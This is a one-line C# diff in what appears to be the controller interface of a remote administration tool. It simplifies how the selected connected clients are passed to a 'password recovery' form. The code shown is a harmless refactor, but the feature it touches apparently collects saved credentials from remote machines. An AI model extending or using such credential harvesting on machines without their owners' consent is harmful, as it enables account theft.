@@ -593,7 +593,7 @@ namespace xServer.Forms
         {
             if (lstClients.SelectedItems.Count != 0)
             {
-                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients().ToList());
+                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients());
                 frmPass.Show();
             }
         }
